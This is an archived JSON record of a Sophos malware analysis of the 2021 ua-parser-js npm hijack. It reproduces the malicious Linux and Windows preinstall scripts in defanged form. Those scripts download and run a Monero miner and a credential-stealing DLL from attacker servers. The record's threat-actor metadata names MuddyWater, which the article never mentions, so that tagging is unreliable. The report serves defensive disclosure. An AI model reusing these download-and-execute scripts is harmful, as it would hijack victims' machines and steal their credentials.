{
    "id": "202b1cb6-3987-4a22-a39a-4f21302de662",
    "created_at": "2023-01-12T15:05:15.06536Z",
    "updated_at": "2025-03-27T02:05:45.252503Z",
    "deleted_at": null,
    "sha1_hash": "a5515f3b1eba7dc5547151b0de775253b2c68adc",
    "title": "2021-10-24 - Node poisoning- hijacked package delivers coin miner and credential-stealing backdoor",
    "authors": "",
    "file_creation_date": "2022-05-28T01:22:59Z",
    "file_modification_date": "2022-05-28T01:22:59Z",
    "file_size": 915711,
    "plain_text": "# Node poisoning: hijacked package delivers coin miner and credential-stealing backdoor\n\n**news.sophos.com/en-us/2021/10/24/node-poisoning-hijacked-package-delivers-coin-miner-and-credential-stealing-**\nbackdoor\n\nSean Gallagher October 25, 2021\n\nOn October 22, the NPM repository account associated with a popular node.js was briefly\nhijacked and used to distribute a malicious script. On Linux machines, the script installed a\nMonero miner; on Windows systems, it also dropped malware that attempted to harvest user\ncredential information. MacOS systems were unaffected.\n\nThis attack highlights the previously-exposed hazards associated with open-source\n[repository poisoning. There have been three other NPM-based attacks in October, using](https://therecord.media/crypto-miner-found-hidden-inside-three-npm-libraries/?__cf_chl_jschl_tk__=pmd_YCpY4LzyNOsC.Fq947.VpJwHJrCqYpM7RvDi5fKgtow-1635121073-0-gqNtZGzNAmWjcnBszQv9)\nfraudulent JavaScript libraries that claimed to have the same functionality as the one that\nwas hijacked—all of which instead attempted to install miners. But the hijacking was a much\ngreater threat due to the large volume of downloads of the affected library (which saw over 7\nmillion downloads in the last week). According to the developer’s web page, the module is\nused by companies such as Facebook, Apple, Amazon, Microsoft, Slack, IBM, HPE, Dell,\nOracle, Mozilla, Shopify, and Reddit.\n\nBecause of that download volume, there may have been many systems impacted by the\nmaliciously altered module in the short window that it was hijacked. To date, Sophos has\nidentified a relatively small number of systems exposed to the attack, but we continue to\nmonitor the situation and investigate the malware delivered by the script.\n\n\n-----\n\n## The hijack\n\n[Sometime on Friday, the hijacker exploited the NPM account of the developer of UAParser.js](https://www.npmjs.com/package/ua-parser-js)\n—a library used by web applications to detect information about user’s browser types and\noperating systems. The attacker used that access to modify the deployment package for the\nlibrary, adding instructions to run a new script named preinstall.js. Also added to the package\nwere preinstall.bat and preinstall.sh—the Windows and Linux scripts to be executed by the\nnode.js package. The hijacker then pushed out the changes as three new versions: 0.7.29,\n0.8.0, and 1.0.0.\n\nA number of users reported malware detections resulting from the new module pushes\n[through the developer’s GitHub page. Within a few hours, the developer responded that he](https://github.com/faisalman/ua-parser-js/issues/536)\nhad noticed the hijacking after receiving a bombardment of spam email messages, likely\nintended to prevent him from getting alerts about his compromised account. “Luckily the\neffect [was] quite the contrary,” he wrote, adding that he had reported the modified versions\nas malware, but could not unpublish them. After some discussion about the impact, he\nrepublished clean versions of the library with the version numbers 0.7.30, 0.8.1, and 1.0.1.\n\nIt is not yet known how many systems downloaded the malicious versions of the UAParser.js\npackage.\n\n## The payload\n\nThe preinstall.js script performed operating system detection. On MacOS systems, it did\nnothing; for Linux and Windows, it executed the corresponding script files (using a bash shell\nor cmd.exe, depending on the target).\n\nThe Linux script first made a web request from an IP address checker to look for the country\ncode associated with the system running the script. If the check returned a country code for\nRussia, Ukraine, Kazakhstan or Belarus, the script then terminated. If not, it would then\ndownload a file named jsextension from a server in Latvia\n(hxxp://159[.]148[.]186[.]228/download/jsextension), first attempting to use curl and failing\n[over to wget. It then executed the file—a copy of the XMRig miner—with parameters to](https://github.com/xmrig/xmrig)\nconnect it to the hijacker’s own wallet:\n\n\n-----\n\n```\nIP $(curl k hxxps://freegeoip[.]app/xml/ | grep RU\\|UA\\|BY\\|KZ )\nIf [ -z \"$IP\" ]\nthen\nvar=$(pgrep jsextension)\nif [ -z \"$var\" ]\nthen\ncurl hxxp://159[.]148[.]186[.]228/download/jsextension -o jsextension\nif [ ! -f jsextension ]\nthen\nwget hxxp://159[.]148[.]186[.]228/download/jsextension -O jsextension\nfi\nchmod +x jsextension\n./jsextension -k --tls --rig-id q -o pool[.]minexmr[.]com:443 -u\n49ay9Aq2r3diJtEk3eeKKm7pc5R39AKnbYJZVqAd1UUmew6ZPX1ndfXQCT16v4trWp4erPyXtUQZTHGjbLXWQd\n --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &\nfi\nfi\n\n```\nThe Windows payload batch file, preinstall.bat, did not include an IP address check. It also\nattempted to download a file from the same Latvian server—first trying to directly download a\nWindows executable version of the miner (jsextension.exe) using curl, then wget if that\nfailed. If both curl and wget failed to directly download the executable, the script then used\nWindows’ certificate utility (certutil.exe) to download a Base64-encoded version of the file\nand decode it as an executable.\n\nThe batch file also attempted to download another file—a Windows dynamic-link library\nretrieved from citationsherbe[.]at, a host in Russia—using the same methods. After retrieving\nboth files, the batch script checks to see if there is already a copy of the miner running; if not,\nit executes the miner and uses Windows’ regsvr32.exe “registration” process to execute the\nmalicious DLL (saved as “create.dll”).\n\n\n-----\n\n```\n@echo off\ncurl hxxp://159[.]148[.]186[.]228/download/jsextension.exe -o jsextension.exe\nif not exist jsextension.exe (\nwget hxxp://159[.]148[.]186[.]228/download/jsextension.exe -O jsextension.exe\n)\nif not exist jsextension.exe (\ncertutil.exe -urlcache -f hxxp://159[.]148[.]186[.]228/download/jsextension.exe\njsextension.exe\n)\ncurl hxxps://citationsherbe[.]at/sdd.dll -o create.dll\nif not exist create.dll (\nwget hxxps://citationsherbe[.]at/sdd.dll -O create.dll\n)\nif not exist create.dll (\ncertutil.exe -urlcache -f hxxps://citationsherbe[.]at/sdd.dll create.dll\n)\nset exe_1=jsextension.exe\nset \"count_1=0\"\n>tasklist.temp (\ntasklist /NH /FI \"IMAGENAME eq %exe_1%\"\n)\nfor /f %%x in (tasklist.temp) do (\nif \"%%x\" EQU \"%exe_1%\" set /a count_1+=1\n)\nif %count_1% EQU 0 (start /B .\\jsextension.exe -k --tls --rig-id q -o\npool[.]minexmr[.]com:443 -u\n49ay9Aq2r3diJtEk3eeKKm7pc5R39AKnbYJZVqAd1UUmew6ZPX1ndfXQCT16v4trWp4erPyXtUQZTHGjbLXWQd\n --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s\ncreate.dll)\ndel tasklist.temp\n\n```\nThat code is a packer identical to that being used in recent Qbot malware attacks. The\n[packer launches information-stealing malware—possibly a new variant of Danabot; there](https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/Troj~Danabot-A/detailed-analysis.aspx)\nhave been reports that the malware targets VNC and FTP clients, mail clients, web\nbrowsers and a host of other Internet-connected applications for credential theft, as well as\nWindows’ own credential manager. Credentials are exfiltrated to one of several IP\naddresses, included in our indicators of compromise.\n\nSince the hijack attack was first detected, the attacker behind the DLL has pushed out a new\nversion–essentially a rebuild of the packer, with no real changes to behavior. We will update\nthis post and our IoC file on SophosLabs’ GitHub with new information as it becomes\navailable.\n\n## Antidotes to a poisoned node\n\nThe repeated attempts to use NPM to spread miners to Linux systems over the past month is\nfurther proof that Linux servers continue to be a very attractive target for cybercriminals—and\nstealing processing power for cryptomining is an easy way to monetize criminal access to\nthese systems. Many Linux servers run without any antivirus protection installed because\n\n\n-----\n\ntheir operators want to avoid taking a performance hit, but that makes detection and\nmitigation of attacks like these more complex—and mining Monero for someone else isn’t\nexactly optimizing server performance.\n\nSophos’ has deployed Linux detections for this malicious NPM package and its\ncomponents. However, Linux server administrators will still have to remove the unauthorized\nminer if those post-infection components are detected. All Linux administrators with\n[systems that use NPM packages should review the list of indicators of compromise on](https://github.com/sophoslabs/IoCs/blob/master/Mal-BadNode.csv)\nSophosLabs’ GitHub page to ensure they haven’t been infected by the malicious miner.\n\nSecurity operations center teams can also check the URLs and IP addresses in the IOCs\nagainst their firewall and DNS logs for signs of the miner and malware. And as Florian Roth\nof Nextron Systems suggests, administrators and SOC teams should also check for domains\nassociated with coin mining applications in their organization’s network traffic if such activity\nis banned on their networks to discover rogue miners.\n\nA number of the behaviors in the NPM attack trigger generic Sophos detections on Windows,\nso Windows systems protected by Sophos were protected at the time of the attack. The\nminer was also proactively detected by Sophos on Windows as XMRIG Miner PUA, and the\ncredential theft malware was detected prior to the attack as Mal/EncPk-AQC. Additional\ndetections for the NPM scripts were released soon after the attack. The full list of relevant\ndetection names is below:\n\nJS/BadNode-A – the main JS installer from the bad NPM\nBAT/BadNode-A – the Windows BAT installer\nSH/BadNode-A – the Linux shell installer\nXMRig Miner (PUA) – generic proactive potentially unwanted application detection for\nthe Windows miner\nMal/EncPk-AQC – a generic proactive detection for the Windows trojan DLL\n\nAnyone using NPM packages to support their applications should review their installed\nlibraries for compromised versions and update if necessary.\n\n[A list of IOCs is available on SophosLabs’ GitHub page.](https://github.com/sophoslabs/IoCs/blob/master/Mal-BadNode.csv)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-24 - Node poisoning- hijacked package delivers coin miner and credential-stealing backdoor.pdf"
    ],
    "report_names": [
        "2021-10-24 - Node poisoning- hijacked package delivers coin miner and credential-stealing backdoor.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535915,
    "ts_updated_at": 1743041145,
    "ts_creation_date": 1653700979,
    "ts_modification_date": 1653700979,
    "files": {
        "pdf": "https://archive.orkl.eu/a5515f3b1eba7dc5547151b0de775253b2c68adc.pdf",
        "text": "https://archive.orkl.eu/a5515f3b1eba7dc5547151b0de775253b2c68adc.txt",
        "img": "https://archive.orkl.eu/a5515f3b1eba7dc5547151b0de775253b2c68adc.jpg"
    }
}